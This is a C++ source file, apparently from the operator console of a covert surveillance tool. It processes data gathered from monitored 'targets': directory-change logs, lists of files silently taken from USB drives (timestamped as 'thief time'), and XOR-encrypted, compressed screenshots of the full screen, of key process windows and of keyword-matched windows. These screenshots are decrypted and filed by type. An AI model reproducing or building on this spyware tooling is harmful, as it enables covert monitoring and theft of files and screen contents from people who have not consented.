//---------------------------------------------------------------------------

#include "AdkPrecomp.h"

#include "maindlg.h"
#include "LocalDataDir.h"
#include "utility.h"
#include "adkbase64.h"
#include "AdkFile.h"

#include "include/T5Screen.h"

//---------------------------------------------------------------------------
extern ZlibUncompress g_zlibUncompress;

//---------------------------------------------------------------------------
std::wstring GetDirDataFileName(std::wstring    widDirPath,
								std::string    dirPathBase64,
								bool          &bExisted)
{
	WCHAR widePath[MAX_PATH * 8];
	ZeroMemory((PBYTE)widePath, MAX_PATH * 8);
	AdkBase64Decode(dirPathBase64.c_str(), dirPathBase64.length(), (PBYTE)widePath, MAX_PATH * 8);

	widePath[1] = L';';
	for (int i = 0; i < AdkWcsLen(widePath); i ++)
	{
		if (widePath[i] == L'\\')
		{
			widePath[i] = L'$';
		}
	}

	// 为了突破MAX_PATH的限制, 增加 \\?\
	//
	std::wstring widFileName = std::wstring(L"\\\\?\\") + widDirPath + L"\\" + widePath + L".txt";
	bExisted = AdkFileIsExistW(widFileName.c_str());

	return widFileName;
}
//---------------------------------------------------------------------------
bool ExportDirDataToLocal(DWORD       dwTargetID,
						  const wchar_t *lpwzfileName,
						  const char    *lpsztimeStr,
						  const wchar_t *lpwzdirPath,
						  const char    *lpszdirData)
{
	HANDLE hOutputFile = CreateFileW(lpwzfileName,
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	WCHAR wzOutput[1024];
	DWORD dwByteWritten;
	DWORD dwSize = GetFileSize(hOutputFile, NULL);
	if (dwSize == 0)
	{
		UCHAR flag[2] = {0xff, 0xfe};
		WriteFile(hOutputFile, flag, 2 * sizeof(UCHAR), &dwByteWritten, NULL);

		wcscpy(wzOutput, L"             目录数据变动过程记录            \r\n\r\n");
		WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);

		wsprintfW(wzOutput, L"目标:%d \r\n目录:%s\r\n\r\n\r\n", dwTargetID, lpwzdirPath);
		WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);
	}

	SetFilePointer(hOutputFile, 0, NULL, FILE_END);

	wsprintfW(wzOutput, L"获取时间:%S\r\n\r\n", lpsztimeStr);
	WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);
	wcscpy(wzOutput, L" 类型              大小     最后修改时间     路径\r\n"\
		L"----------------------------------------------------------------------------------\r\n");
	WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);

	DWORD dwFileCount = 0;
	DWORD dwDirCount = 0;

	if (lpszdirData)
	{
		// 写文件
		//
		int nDirIndex = 0;
		FILETIME    local;
		std::vector<struct _FILE_BLOCK *> dirVect;
		std::string dirInfo = lpszdirData;
		dirVect  = SplitDirString(dirInfo, "|", "*");

		int index = 0;
		std::vector<PFILE_BLOCK>::iterator i = dirVect.begin();
		for (; i != dirVect.end(); i++, index++)
		{
			PFILE_BLOCK fileBlock = (*i);

			if ((0 == wcscmp(fileBlock->widName.c_str(), L".")) ||
				(0 == wcscmp(fileBlock->widName.c_str(), L"..")))
			{
				continue;
			}

			SYSTEMTIME  systime;
			FILETIME    local;
			FileTimeToLocalFileTime((FILETIME*)&fileBlock->LastWriteTime, &local);
			FileTimeToSystemTime(&local,&systime);

			if (fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				dwDirCount++;
				wsprintfW(wzOutput, L"文件夹                  %02d-%02d-%02d %02d:%02d   %s\r\n",
					systime.wYear,systime.wMonth,
					systime.wDay ,systime.wHour ,systime.wMinute,
					fileBlock->widName.c_str());
			}
			else
			{
				dwFileCount++;
				int filesize = fileBlock->Size/1024;
				if (filesize == 0 && fileBlock->Size != 0)
				{
					filesize = 1;
				}

				wsprintfW(wzOutput, L"          %9d KB  %02d-%02d-%02d %02d:%02d   %s\r\n",
					filesize,
					systime.wYear,systime.wMonth,
					systime.wDay ,systime.wHour ,systime.wMinute,
					fileBlock->widName.c_str());
			}

			WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);
		}
	}

	wsprintfW(wzOutput, L"\r\n统计: 共有%d个文件夹和%d个文件\r\n\r\n", dwDirCount, dwFileCount);
	WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);

	CloseHandle(hOutputFile);

	return true;
}
//---------------------------------------------------------------------------
bool ExportUsbFileToLocal(DWORD          dwTargetID,
						  const wchar_t *lpwzFileName,
						  const wchar_t *lpwzRealPath,
						  const wchar_t *lpwzThiefTime,
						  const wchar_t *lpwzLwTime,
						  DWORD          dwFileSize)
{
	xASSERT((lpwzFileName));
	xASSERT((lpwzRealPath));
	xASSERT((lpwzThiefTime));
	xASSERT((lpwzLwTime));

	HANDLE hOutputFile = CreateFileW(lpwzFileName,
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	WCHAR wzOutput[1024];
	DWORD dwByteWritten;
	DWORD dwSize = GetFileSize(hOutputFile, NULL);
	if (dwSize == 0)
	{
		UCHAR flag[2] = {0xff, 0xfe};
		WriteFile(hOutputFile, flag, 2 * sizeof(UCHAR), &dwByteWritten, NULL);

		wcscpy(wzOutput, L"             自动获取的USB盘文件列表            \r\n\r\n");
		WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);

		wsprintfW(wzOutput, L"目标:%d \r\n\r\n", dwTargetID);
		WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);

		wcscpy(wzOutput, L"     U盘获取时间           大小         最后修改时间           路径\r\n"\
			L"----------------------------------------------------------------------------------\r\n");
		WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);
	}

	SetFilePointer(hOutputFile, 0, NULL, FILE_END);

	int filesize = dwFileSize/1024;
	if (filesize == 0 && dwFileSize != 0)
	{
		filesize = 1;
	}

	wsprintfW(wzOutput, L"%s   %9d KB  %0s   %s\r\n",
		lpwzThiefTime,
		filesize,
		lpwzLwTime,
		lpwzRealPath);

	WriteFile(hOutputFile, wzOutput, AdkWcsLen(wzOutput) * sizeof(WCHAR), &dwByteWritten, NULL);

	CloseHandle(hOutputFile);

	return true;
}
//---------------------------------------------------------------------------
std::wstring GetScreenFileName(PCAPTURE_FILE_HEADER lpCapHeader,
							   const wchar_t       *lpwzSavePath,
							   wchar_t             *lpwzNodeName,
							   wchar_t             *lpwzFileName)
{
	std::wstring  widSavePath = lpwzSavePath;
	FILETIME	savetime;
	FILETIME    locSavetime;
	SYSTEMTIME	st;

	savetime = lpCapHeader->ftSavetime;
	FileTimeToLocalFileTime(&savetime, &locSavetime);
	FileTimeToSystemTime(&locSavetime, &st);

	if (lpCapHeader->dwPrintType == FULLSCREEN
		|| *(PBOOL)((PBYTE)lpCapHeader + 12) == 1)
	{
		// 生成全屏文件保存目录
		//
		lstrcpyW(lpwzNodeName, L"全屏");        
		widSavePath = widSavePath + L"\\全屏\\";
		AdkCreateDirectoryW(widSavePath.c_str());

		// 生成包括路径的文件名
		//
		wsprintfW(lpwzFileName, L"S_%d-%02d-%02d_%02d;%02d;%02d.bmp",
			st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

		widSavePath += lpwzFileName;
	}
	else if (lpCapHeader->dwPrintType == KEYPROCESSWND
		|| *(PBOOL)((PBYTE)lpCapHeader + 16) == 1)
	{
		// 生成相应进程的保存目录
		//
		lstrcpyW(lpwzNodeName, lpCapHeader->wzProcessName);
		lstrcpyW(lpwzNodeName + lstrlenW(lpwzNodeName)-4, L"\0\0\0\0");
		widSavePath = widSavePath + L"\\" + lpwzNodeName + L"\\";

		AdkCreateDirectoryW(widSavePath.c_str());

		// 生成包括路径的文件名
		//
		wsprintfW(lpwzFileName, L"%s_%d-%02d-%02d_%02d;%02d;%02d.bmp",
			lpwzNodeName, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
		widSavePath = widSavePath + lpwzFileName;
	}
	else if (lpCapHeader->dwPrintType == KEYTITLEWINDOW
		|| *(PBOOL)((PBYTE)lpCapHeader + 20) == 1)
	{
		// 生成保存目录
		//
		lstrcpyW(lpwzNodeName, L"关键字窗口");
		widSavePath = widSavePath + L"\\关键字窗口\\";

		AdkCreateDirectoryW(widSavePath.c_str());

		// 生成包括路径的文件名
		//
		wsprintfW(lpwzFileName, L"K_%d-%02d-%02d_%02d;%02d;%02d.bmp",
			st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
		widSavePath += lpwzFileName;
	}

	return widSavePath;
}
//---------------------------------------------------------------------------
bool ExportScreenFileToLocal(const char *lpszSrcFileName,
							 const wchar_t *lpwzSavePath,
							 wchar_t    *lpwzNodeName,
							 wchar_t    *lpwzFileName)
{
	PCAPTURE_FILE_HEADER	lpCapHeader = NULL;
	PBYTE	lpInBuf  = NULL;
	PBYTE	lpOutBuf = NULL;
	DWORD	dwInSize;
	DWORD   dwReadByte;
	DWORD   dwOutSize = 1024 * 256;	// 写入的最大字节数

	AdkASSERT(lpwzFileName);
	AdkASSERT(lpwzSavePath);

	if (! AdkFileIsExistA(lpszSrcFileName))
	{
		return FALSE;
	}

	do
	{
		dwInSize = AdkGetFileSizeFromNameA(lpszSrcFileName);

		lpInBuf  = (PBYTE)AdkMalloc(dwInSize);
		if ( ! AdkFileReaderA(lpszSrcFileName, dwInSize, &dwReadByte, lpInBuf, dwInSize))
		{
			break;
		}

		AdkXorMemory((PBYTE)lpInBuf, 95, dwReadByte);		// 异或解密

		lpCapHeader = (PCAPTURE_FILE_HEADER)lpInBuf;
		if (lpCapHeader->dwMagicNumber != PRINT_SCREEN_MAGIC)
		{
			break;
		}

		PBYTE start = lpInBuf + sizeof(CAPTURE_FILE_HEADER);
		int sizeH = sizeof(CAPTURE_FILE_HEADER);
		int sizeT = sizeof(FILETIME);

		lpOutBuf = (PBYTE)AdkMalloc(dwOutSize);      

		int errid = g_zlibUncompress(lpOutBuf,
			&dwOutSize,
			lpInBuf + sizeof(CAPTURE_FILE_HEADER),
			dwReadByte - sizeof(CAPTURE_FILE_HEADER));

		// 获取文件名，解压
		//
		std::wstring wzFileName = GetScreenFileName(lpCapHeader,
													lpwzSavePath,
													lpwzNodeName,
													lpwzFileName);

		AdkFileWriterW(wzFileName.c_str(), lpOutBuf, dwOutSize);

	} while (false);

	if (lpInBuf)
	{
		AdkFree(lpInBuf);
	}

	if (lpOutBuf)
	{
		AdkFree(lpOutBuf);
	}

	return TRUE;
}
